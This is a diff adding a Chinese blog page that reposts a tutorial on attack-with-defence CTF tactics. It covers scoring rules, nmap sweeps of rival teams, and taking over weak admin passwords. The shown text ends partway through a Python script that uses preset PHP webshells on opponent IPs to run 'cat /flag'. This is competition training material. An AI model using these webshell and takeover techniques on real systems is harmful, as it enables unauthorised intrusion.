@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>CTF线下赛AWD套路小结 | Deops&#39;s.cn | 运维技术分享</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="CTF,信息安全,网络空间安全,Python">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="CTF网络安全攻防赛入门，如果你对黑客攻防感兴趣的话看看这篇入门。新手该知道的一些知识以及技巧，下面简单整理一下">
+<meta name="keywords" content="CTF,信息安全,网络空间安全,Python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF线下赛AWD套路小结">
+<meta property="og:url" content="http://deops.cn/posts/28c30eb2/index.html">
+<meta property="og:site_name" content="Deops&#39;s.cn">
+<meta property="og:description" content="CTF网络安全攻防赛入门，如果你对黑客攻防感兴趣的话看看这篇入门。新手该知道的一些知识以及技巧，下面简单整理一下">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://wx2.sinaimg.cn/mw690/006ALkzYly1fu99r097baj30lq0fg40q.jpg">
+<meta property="og:image" content="https://wx1.sinaimg.cn/mw690/006ALkzYgy1fu9cs4y09ej311f0ny7ds.jpg">
+<meta property="og:image" content="https://wx4.sinaimg.cn/mw690/006ALkzYgy1fu9copyyifj30m40gvtfi.jpg">
+<meta property="og:image" content="https://wx3.sinaimg.cn/mw690/006ALkzYgy1fu9cuclrdyj30m40b344h.jpg">
+<meta property="og:image" content="https://wx1.sinaimg.cn/mw690/006ALkzYly1fu9m5f56s3j30lz0edtdi.jpg">
+<meta property="og:image" content="https://wx1.sinaimg.cn/mw690/006ALkzYly1fu9mac2q97j30lx0eidqt.jpg">
+<meta property="og:image" content="https://wx2.sinaimg.cn/mw690/006ALkzYly1fu9maehbaqj30mg0bp0xj.jpg">
+<meta property="og:image" content="https://wx4.sinaimg.cn/mw690/006ALkzYly1fvyfmg5lngj30ya0efn9u.jpg">
+<meta property="og:image" content="https://wx1.sinaimg.cn/mw690/006ALkzYly1fvyfmfhytnj30j807rwf9.jpg">
+<meta property="og:updated_time" content="2018-10-06T05:25:33.720Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF线下赛AWD套路小结">
+<meta name="twitter:description" content="CTF网络安全攻防赛入门，如果你对黑客攻防感兴趣的话看看这篇入门。新手该知道的一些知识以及技巧，下面简单整理一下">
+<meta name="twitter:image" content="https://wx2.sinaimg.cn/mw690/006ALkzYly1fu99r097baj30lq0fg40q.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="Deops&#39;s.cn" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu" class="hide">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.gif" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Echo</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/">
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives">
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories">
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags">
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about">
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=442KgIbNhZajhYybjoKKj82AjI4" target="_parent" title="Email">
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Marnm" target="_blank" title="Github">
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/6040025614" target="_blank" title="微博">
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">CTF线下赛AWD套路小结</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#一、AWD模式简介"><span class="post-toc-number">1.</span> <span class="post-toc-text">一、AWD模式简介</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#二、网络环境"><span class="post-toc-number">2.</span> <span class="post-toc-text">二、网络环境</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#三、-比赛分工"><span class="post-toc-number">3.</span> <span class="post-toc-text">三、 比赛分工</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#四、-一些“套路”"><span class="post-toc-number">4.</span> <span class="post-toc-text">四、 一些“套路”</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#五、权限维持"><span class="post-toc-number">5.</span> <span class="post-toc-text">五、权限维持</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#六、-通用防御"><span class="post-toc-number">6.</span> <span class="post-toc-text">六、 通用防御</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#七、自动提交"><span class="post-toc-number">7.</span> <span class="post-toc-text">七、自动提交</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#八、流量、日志"><span class="post-toc-number">8.</span> <span class="post-toc-text">八、流量、日志</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#最后"><span class="post-toc-number">9.</span> <span class="post-toc-text">最后</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-CTF线下赛AWD套路小结" class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">CTF线下赛AWD套路小结</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2018-08-13 17:03:28" datetime="2018-08-13T09:03:28.000Z" itemprop="datePublished">2018-08-13</time>
+
+            <br id="mybreak">
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>
+
+
+            <i>·</i>
+            
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">21</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>CTF&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x653B;&#x9632;&#x8D5B;&#x5165;&#x95E8;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x5BF9;&#x9ED1;&#x5BA2;&#x653B;&#x9632;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x8BDD;&#x770B;&#x770B;&#x8FD9;&#x7BC7;&#x5165;&#x95E8;&#x3002;<br>&#x65B0;&#x624B;&#x8BE5;&#x77E5;&#x9053;&#x7684;&#x4E00;&#x4E9B;&#x77E5;&#x8BC6;&#x4EE5;&#x53CA;&#x6280;&#x5DE7;&#xFF0C;&#x4E0B;&#x9762;&#x7B80;&#x5355;&#x6574;&#x7406;&#x4E00;&#x4E0B;<br><a id="more"></a></p>
+<blockquote>
+<p>&#x539F;&#x521B;&#xFF1A;tinyfisher<br>&#x8F6C;&#x8F7D;&#xFF1A;<a href="https://xz.aliyun.com/" target="_blank" rel="noopener">&#x5148;&#x77E5;&#x5B89;&#x5168;&#x6280;&#x672F;&#x793E;&#x533A;</a></p>
+</blockquote>
+<p>&#x6700;&#x8FD1;&#x6253;&#x4E86;2&#x573A;CTF&#x7EBF;&#x4E0B;&#x8D5B;&#xFF0C;&#x628A;AWD&#x6A21;&#x5F0F;&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x5C0F;&#x5957;&#x8DEF;&#x505A;&#x4E00;&#x4E9B;&#x603B;&#x7ED3;&#xFF0C;&#x672C;&#x4EBA;web&#x72D7;&#xFF0C;&#x4E8C;&#x8FDB;&#x5236;&#x90E8;&#x5206;&#x5C31;&#x4E0D;&#x73ED;&#x95E8;&#x5F04;&#x65A7;&#x4E86;&#x3002;</p>
+<h1 id="&#x4E00;&#x3001;AWD&#x6A21;&#x5F0F;&#x7B80;&#x4ECB;"><a href="#&#x4E00;&#x3001;AWD&#x6A21;&#x5F0F;&#x7B80;&#x4ECB;" class="headerlink" title="&#x4E00;&#x3001;AWD&#x6A21;&#x5F0F;&#x7B80;&#x4ECB;"></a>&#x4E00;&#x3001;AWD&#x6A21;&#x5F0F;&#x7B80;&#x4ECB;</h1><p>AWD: Attack With Defence, &#x6BD4;&#x8D5B;&#x4E2D;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x7EF4;&#x62A4;&#x591A;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x5B58;&#x5728;&#x591A;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF0C;&#x5229;&#x7528;&#x6F0F;&#x6D1E;&#x653B;&#x51FB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x5F97;&#x5206;&#xFF0C;&#x4FEE;&#x590D;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x653B;&#x51FB;&#x5931;&#x5206;&#x3002;<br><!--more--></p>
+<ol>
+<li>&#x4E00;&#x822C;&#x5206;&#x914D;Web&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x591A;&#x6570;&#x4E3A;Linux&#xFF09;&#x67D0;&#x5904;&#x5B58;&#x5728;flag&#xFF08;&#x4E00;&#x822C;&#x5728;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#xFF09;&#xFF1B;</li>
+<li>&#x53EF;&#x80FD;&#x4F1A;&#x63D0;&#x4F9B;&#x4E00;&#x53F0;&#x6D41;&#x91CF;&#x5206;&#x6790;&#x865A;&#x62DF;&#x673A;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0B;&#x8F7D;&#x6D41;&#x91CF;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x5206;&#x6790;&#xFF1B;</li>
+<li>flag&#x5728;&#x4E3B;&#x529E;&#x65B9;&#x7684;&#x8BBE;&#x5B9A;&#x4E0B;&#x6BCF;&#x9694;&#x4E00;&#x5B9A;&#x65F6;&#x95F4;&#x5237;&#x65B0;&#x4E00;&#x8F6E;&#xFF1B;</li>
+<li>&#x5404;&#x961F;&#x4E00;&#x822C;&#x90FD;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x521D;&#x59CB;&#x5206;&#x6570;&#xFF1B;</li>
+<li>flag&#x4E00;&#x65E6;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x62FF;&#x8D70;&#xFF0C;&#x8BE5;&#x961F;&#x6263;&#x9664;&#x4E00;&#x5B9A;&#x79EF;&#x5206;&#xFF1B;</li>
+<li>&#x6263;&#x9664;&#x7684;&#x79EF;&#x5206;&#x6709;&#x83B7;&#x53D6;flag&#x7684;&#x961F;&#x4F0D;&#x5747;&#x5206;&#xFF1B;</li>
+<li>&#x4E3B;&#x529E;&#x65B9;&#x4F1A;&#x5BF9;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x7684;&#x670D;&#x52A1;&#x8FDB;&#x884C;check&#xFF0C;&#x670D;&#x52A1;&#x5B95;&#x673A;&#x6263;&#x9664;&#x672C;&#x8F6E;flag&#x5206;&#x6570;&#xFF0C;&#x6263;&#x9664;&#x7684;&#x5206;&#x503C;&#x7531;&#x670D;&#x52A1;check&#x6B63;&#x5E38;&#x7684;&#x961F;&#x4F0D;&#x5747;&#x5206;&#xFF1B;</li>
+<li>&#x4E00;&#x822C;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x4F1A;&#x7ED9;&#x4E00;&#x4E2A;&#x4F4E;&#x6743;&#x9650;&#x7528;&#x6237;&#xFF0C;&#x975E;root&#x6743;&#x9650;</li>
+</ol>
+<h1 id="&#x4E8C;&#x3001;&#x7F51;&#x7EDC;&#x73AF;&#x5883;"><a href="#&#x4E8C;&#x3001;&#x7F51;&#x7EDC;&#x73AF;&#x5883;" class="headerlink" title="&#x4E8C;&#x3001;&#x7F51;&#x7EDC;&#x73AF;&#x5883;"></a>&#x4E8C;&#x3001;&#x7F51;&#x7EDC;&#x73AF;&#x5883;</h1><p>&#x7F51;&#x7EDC;&#x62D3;&#x6251;&#x56FE;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p>
+<hr>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://wx2.sinaimg.cn/mw690/006ALkzYly1fu99r097baj30lq0fg40q.jpg" alt="&#x62D3;&#x6251;&#x56FE;" title="">
+                </div>
+                <div class="image-caption">&#x62D3;&#x6251;&#x56FE;</div>
+            </figure>
+<p>&#x6BD4;&#x8D5B;&#x4E2D;&#x83B7;&#x53D6;flag&#x4E00;&#x822C;&#x6709;&#x4E24;&#x79CD;&#x6A21;&#x5F0F;&#xFF1A;<br>&#xFF08;1&#xFF09;flag&#x5728;&#x6839;&#x76EE;&#x5F55;&#xFF0C;&#x8BFB;&#x53D6;flag&#x5185;&#x5BB9;&#xFF0C;&#x63D0;&#x4EA4;&#x5373;&#x53EF;&#x5F97;&#x5206;<br>&#xFF08;2&#xFF09;&#x62FF;&#x5230;&#x5176;&#x4ED6;&#x961F;&#x4F0D;shell&#x540E;&#xFF0C;&#x6267;&#x884C;&#x6307;&#x5B9A;&#x547D;&#x4EE4;&#xFF08;curl 10.0.0.2&#xFF09;&#xFF0C;&#x5373;&#x53EF;&#x4ECE;&#x4E0A;&#x56FE;&#x4E2D;flag&#x673A;&#x83B7;&#x53D6;flag&#x5185;&#x5BB9;&#xFF1B;</p>
+<p>&#x6BD4;&#x8D5B;&#x53EF;&#x80FD;&#x4F1A;&#x544A;&#x8BC9;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;IP&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x4E0D;&#x4F1A;&#x544A;&#x8BC9;&#x4F60;&#xFF0C;&#x4E00;&#x822C;&#x5728;&#x540C;&#x4E00;&#x4E2A;C&#x6BB5;&#x6216;&#x8005;B&#x6BB5;&#xFF0C;&#x56E0;&#x6B64;&#x9996;&#x5148;&#x5229;&#x7528;nmap&#x7B49;&#x626B;&#x63CF;&#x5DE5;&#x5177;&#x53D1;&#x73B0;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;IP&#xFF1A;<br><code>nmap -sn 192.168.71.0/24</code><br>&#x6216;&#x8005;&#x5229;&#x7528;<a href="https://github.com/zer0h/httpscan" target="_blank" rel="noopener">https://github.com/zer0h/httpscan</a> &#x7684;&#x811A;&#x672C;&#x8FDB;&#x884C;&#x626B;&#x63CF;</p>
+<h1 id="&#x4E09;&#x3001;-&#x6BD4;&#x8D5B;&#x5206;&#x5DE5;"><a href="#&#x4E09;&#x3001;-&#x6BD4;&#x8D5B;&#x5206;&#x5DE5;" class="headerlink" title="&#x4E09;&#x3001; &#x6BD4;&#x8D5B;&#x5206;&#x5DE5;"></a>&#x4E09;&#x3001; &#x6BD4;&#x8D5B;&#x5206;&#x5DE5;</h1><p>&#x7EBF;&#x4E0B;&#x8D5B;&#x4E00;&#x822C;3&#x4EBA;&#x5DE6;&#x53F3;&#xFF0C;2&#x4EBA;&#x653B;&#x51FB;&#xFF0C;1&#x4EBA;&#x9632;&#x5FA1;&#xFF0C;&#x56E0;&#x4E3A;&#x53D1;&#x73B0;&#x7684;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x653B;&#x51FB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#xFF0C;&#x4E5F;&#x8981;&#x8FDB;&#x884C;&#x4FEE;&#x590D;&#xFF0C;&#x6240;&#x4EE5;&#x653B;&#x9632;&#x76F8;&#x8F85;&#x76F8;&#x6210;&#xFF0C;&#x4EE5;&#x653B;&#x4E3A;&#x5B88;&#x3002;</p>
+<p>&#x6BD4;&#x8D5B;&#x4E2D;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x53EF;&#x80FD;&#x4F1A;&#x7EF4;&#x62A4;&#x591A;&#x4E2A;&#x9776;&#x673A;&#xFF0C;web&#x3001;&#x4E8C;&#x8FDB;&#x5236;&#x7B49;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x6CA1;&#x4EBA;&#x8D1F;&#x8D23;&#x4E00;&#x53F0;&#xFF0C;&#x5404;&#x81EA;&#x8D1F;&#x8D23;&#x653B;&#x51FB;&#x548C;&#x9632;&#x5FA1;&#x3002;</p>
+<h1 id="&#x56DB;&#x3001;-&#x4E00;&#x4E9B;&#x201C;&#x5957;&#x8DEF;&#x201D;"><a href="#&#x56DB;&#x3001;-&#x4E00;&#x4E9B;&#x201C;&#x5957;&#x8DEF;&#x201D;" class="headerlink" title="&#x56DB;&#x3001; &#x4E00;&#x4E9B;&#x201C;&#x5957;&#x8DEF;&#x201D;"></a>&#x56DB;&#x3001; &#x4E00;&#x4E9B;&#x201C;&#x5957;&#x8DEF;&#x201D;</h1><ol>
+<li>&#x5907;&#x4EFD;&#xFF01;&#x5907;&#x4EFD;&#xFF01;&#x5907;&#x4EFD;&#xFF01;<br>&#x91CD;&#x8981;&#x7684;&#x4E8B;&#x60C5;&#x8BF4;&#x4E09;&#x904D;&#xFF0C;&#x6BD4;&#x8D5B;&#x5F00;&#x59CB;&#x540E;&#x7B2C;&#x4E00;&#x65F6;&#x95F4;&#x5907;&#x4EFD;&#x670D;&#x52A1;&#x5668;&#x4E2D;web&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6587;&#x4EF6;&#xFF08;/var/www/html)&#xFF0C;&#x8FD9;&#x662F;&#x6211;&#x81EA;&#x6211;&#x5BA1;&#x8BA1;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x4E5F;&#x662F;&#x9632;&#x6B62;&#x670D;&#x52A1;&#x5668;&#x5728;&#x6BD4;&#x8D5B;&#x4E2D;&#x51FA;&#x73B0;&#x5F02;&#x5E38;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x53EF;&#x4EE5;&#x7ACB;&#x5373;&#x6062;&#x590D;&#x5230;&#x521D;&#x59CB;&#x72B6;&#x6001;&#x7684;&#x5148;&#x51B3;&#x6761;&#x4EF6;&#x3002;&#x6709;&#x7684;&#x6BD4;&#x8D5B;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;3&#x6B21;&#x5DE6;&#x53F3;&#x7684;&#x6062;&#x590D;&#x521D;&#x59CB;&#x8BBE;&#x7F6E;&#x7684;&#x673A;&#x4F1A;&#xFF0C;&#x6709;&#x7684;&#x6BD4;&#x8D5B;&#x4E0D;&#x63D0;&#x4F9B;&#xFF0C;&#x6240;&#x4EE5;&#x5907;&#x4EFD;&#x5341;&#x5206;&#x91CD;&#x8981;&#x3002;</li>
+</ol>
+<p>&#x53EF;&#x4EE5;&#x7528;scp&#x547D;&#x4EE4;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x4E00;&#x4E9B;&#x56FE;&#x5F62;&#x5316;&#x7684;&#x5DE5;&#x5177;&#xFF1A;<code>Winscp</code>&#x3001;<code>FileZilla</code>&#xFF0C;&#x64CD;&#x4F5C;&#x8D77;&#x6765;&#x6BD4;&#x4EF7;&#x65B9;&#x4FBF;&#x3002;<br></p><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://wx1.sinaimg.cn/mw690/006ALkzYgy1fu9cs4y09ej311f0ny7ds.jpg" alt="winscp" title="">
+                </div>
+                <div class="image-caption">winscp</div>
+            </figure><p></p>
+<ol start="2">
+<li>&#x53E3;&#x4EE4;&#x95EE;&#x9898;<br>&#x5F31;&#x53E3;&#x4EE4;&#x7684;&#x95EE;&#x9898;&#x51E0;&#x4E4E;&#x662F;&#x5FC5;&#x8003;&#xFF0C;&#x6BD4;&#x8D5B;&#x5F00;&#x59CB;&#x540E;&#xFF0C;&#x5982;&#x679C;&#x53D1;&#x73B0;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x7684;SSH&#x8D26;&#x53F7;&#x5BC6;&#x7801;&#x90FD;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF08;&#x67D0;&#x6B21;&#x6BD4;&#x8D5B;&#x4E2D;&#x90FD;&#x662F;phpCMS&#x3001;WordPress&#xFF09;&#xFF0C;&#x9700;&#x8981;&#x7ACB;&#x5373;&#x4FEE;&#x6539;&#x53E3;&#x4EE4;&#xFF0C;&#x5982;&#x679C;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x6539;&#x4E86;&#x90A3;&#x5C31;gg&#x4E86;&#x3002;</li>
+</ol>
+<p>Web&#x540E;&#x53F0;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x5F31;&#x53E3;&#x4EE4;&#xFF0C;&#x4E00;&#x822C;&#x90FD;&#x662F;admin\admin,admin\123456,test\test&#x7B49;&#x7B49;&#xFF0C;&#x9700;&#x8981;&#x7ACB;&#x5373;&#x4FEE;&#x6539;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;&#x540E;&#x53F0;&#x53E3;&#x4EE4;&#xFF0C;&#x4E3A;&#x672C;&#x961F;&#x6240;&#x7528;&#xFF0C;&#x8BF4;&#x4E0D;&#x5B9A;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x540E;&#x53F0;getshell&#xFF0C;&#x6BD4;&#x5982;&#x5341;&#x5206;&#x5E38;&#x89C1;&#x7684;WordPress&#x3002;<br><!--more--></p>
+<ol start="3">
+<li>&#x9884;&#x7559;&#x540E;&#x95E8;<br>&#x5728;&#x7EF4;&#x62A4;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x5DF2;&#x7ECF;&#x9884;&#x7559;&#x4E86;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x540E;&#x95E8;&#xFF0C;&#x6BD4;&#x5982;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#xFF0C;&#x8FD9;&#x662F;&#x4E2A;&#x9001;&#x5206;&#x9898;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x8FC5;&#x901F;&#x6253;&#x4E00;&#x6CE2;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x89C6;&#x60C5;&#x51B5;&#x201C;&#x6405;&#x5C4E;&#x201D;&#xFF0C;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x4E00;&#x76F4;&#x7EF4;&#x6301;&#x6743;&#x9650;&#xFF0C;&#x6BCF;&#x8F6E;&#x90FD;&#x5F97;&#x5206;&#xFF08;&#x540E;&#x9762;&#x7EC6;&#x8BF4;&#xFF09;<br>&#x5C06;&#x670D;&#x52A1;&#x5668;&#x4E2D;web&#x76EE;&#x5F55;&#x4E0B;&#x8F7D;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x5229;&#x7528;<code>D&#x76FE;</code>&#x626B;&#x63CF;&#xFF0C;&#x4E00;&#x822C;&#x5C31;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x9884;&#x7559;&#x540E;&#x95E8;&#xFF1A;<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://wx4.sinaimg.cn/mw690/006ALkzYgy1fu9copyyifj30m40gvtfi.jpg" alt="D-dun" title="">
+                </div>
+                <div class="image-caption">D-dun</div>
+            </figure>
+&#x53D1;&#x73B0;&#x540E;&#x95E8;&#xFF0C;&#x7B2C;&#x4E00;&#x65F6;&#x95F4;&#x5220;&#x9664;&#xFF0C;&#x540C;&#x65F6;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x53D1;&#x8D77;&#x7B2C;&#x4E00;&#x6CE2;&#x653B;&#x51FB;&#xFF0C;&#x5982;&#x679C;&#x5229;&#x7528;&#x83DC;&#x5200;&#x8FDE;&#xFF0C;&#x663E;&#x7136;&#x4E0D;&#x591F;&#x4F18;&#x96C5;&#xFF0C;&#x8FD8;&#x6CA1;&#x8FDE;&#x5B8C;&#xFF0C;&#x4EBA;&#x5BB6;&#x4F30;&#x8BA1;&#x90FD;&#x5220;&#x7684;&#x5DEE;&#x4E0D;&#x591A;&#x4E86;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x867D;&#x7136;&#x662F;&#x9001;&#x5206;&#x9898;&#xFF0C;&#x4F46;&#x6709;&#x65F6;&#x62FC;&#x7684;&#x662F;&#x624B;&#x901F;&#xFF0C;&#x56E0;&#x6B64;&#x5F97;&#x63D0;&#x524D;&#x51C6;&#x5907;&#x597D;&#x811A;&#x672C;&#xFF1A;<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://192.168.71.&quot;</span></span><br><span class="line">url1=<span class="string">&quot;&quot;</span></span><br><span class="line">shell=<span class="string">&quot;/Upload/index.php&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;abcde10db05bd4f6a24c94d7edde441d18545&quot;</span></span><br><span class="line">port=<span class="string">&quot;80&quot;</span></span><br><span class="line">payload = {passwd: <span class="string">&apos;system(\&apos;cat /flag\&apos;);&apos;</span>}</span><br><span class="line">f=open(<span class="string">&quot;webshelllist.txt&quot;</span>,<span 